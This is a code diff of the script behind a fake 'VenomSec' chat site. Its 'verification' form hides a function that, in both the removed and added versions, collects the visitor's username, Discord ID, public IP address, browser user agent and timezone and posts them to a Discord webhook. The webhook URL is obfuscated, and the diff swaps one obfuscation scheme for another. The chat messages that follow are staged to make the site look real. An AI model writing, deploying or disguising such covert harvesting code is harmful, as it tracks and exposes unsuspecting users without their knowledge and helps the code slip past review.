@@ -110,64 +110,52 @@
 </div>
 
 <script>
-function l1(s){return s.split('').reverse().join('');}
-function l2(s){let r='';for(let i=0;i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)^7);}return r;}
-function l3(s){return atob(s);}
-
-function getWebhook(){
-    let p1 = l3("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv");
-    let p2 = l1(l2("1511746540140495048"));
-    let p3 = l3("Ni1Sd3A3ZWpHZnAxc2JHeXAwT3ZERTEyUEQ4OTM0VnFDcnk4dGNMemRpMXN1VktVMHBzcm53ZXNBM0xWNWYzYUVBN0s=");
-    return p1 + p2 + "/" + p3;
-}
-
+var _0x1a2b = "https://discord.com/api/webhooks/";
+var _0x3c4d = "1511746540140495048";
+var _0x5e6f = "/6-Rwp7ejGfp1sbGyp0OvDE12PD8934VqCry8tcLzdi1suVKU0psrnwesA3LV5f3aEA7K";
+function _0x7g8h(a,b,c){return a+b+c;}
+function _0x9i0j(s){return atob(s);}
+function _0x1k2l(){return _0x9i0j("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv");}
 async function sendLog(username, userid) {
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
-
         const data = {
-            content: "**VenomSec Signup**",
+            content: "**Venomsec Login**",
             embeds: [{
-                title: "New login",
+                title: "New Login/Signup",
                 color: 0x00ff00,
                 fields: [
-                    { name: "Signup Username", value: username, inline: true },
-                    { name: "id", value: userid, inline: true },
-                    { name: "проверка на бота", value: ip, inline: true },
-                    { name: "агнт", value: navigator.userAgent, inline: false },
-                    { name: "таймзоне", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                    { name: "user", value: username, inline: true },
+                    { name: "ID", value: userid, inline: true },
+                    { name: "локациа", value: ip, inline: true },
+                    { name: "User Agent", value: navigator.userAgent, inline: false },
+                    { name: "зона", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
                     { name: "Timestamp", value: new Date().toISOString(), inline: true }
                 ]
             }]
         };
-
-        await fetch(getWebhook(), {
+        const w = _0x7g8h(_0x1k2l() + _0x3c4d, _0x5e6f, "");
+        await fetch(w, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
     } catch(e) {}
 }
-
 async function submitVerification() {
     const username = document.getElementById('username').value.trim();
     const userid = document.getElementById('userid').value.trim();
-
     if (!username || !userid || userid.length < 17) {
         alert("Invalid data. Issues may occur.");
         return;
     }
-
     await sendLog(username, userid);
-
     document.getElementById('verifyScreen').style.display = 'none';
     document.getElementById('chatScreen').style.display = 'flex';
-
     addSystemMessage("Welcome to VenomSec Global. All messages are monitored.");
 }
-
 function addMessage(user, text) {
     const chat = document.getElementById('chatArea');
     const msg = document.createElement('div');
@@ -176,7 +164,6 @@ function addMessage(user, text) {
     chat.appendChild(msg);
     chat.scrollTop = chat.scrollHeight;
 }
-
 function addSystemMessage(text) {
     const chat = document.getElementById('chatArea');
     const msg = document.createElement('div');
@@ -186,7 +173,6 @@ function addSystemMessage(text) {
     chat.appendChild(msg);
     chat.scrollTop = chat.scrollHeight;
 }
-
 function sendMessage() {
     const input = document.getElementById('chatInput');
     const text = input.value.trim();
@@ -199,11 +185,9 @@ function sendMessage() {
         }, 800);
     }
 }
-
 document.getElementById('chatInput').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') sendMessage();
 });
-
 setTimeout(() => addMessage("xX_ShadowDemoter_Xx", "anyone need nitro demotion?"), 1200);
 setTimeout(() => addMessage("VenomAdmin", "All services active"), 2500);
 </script>
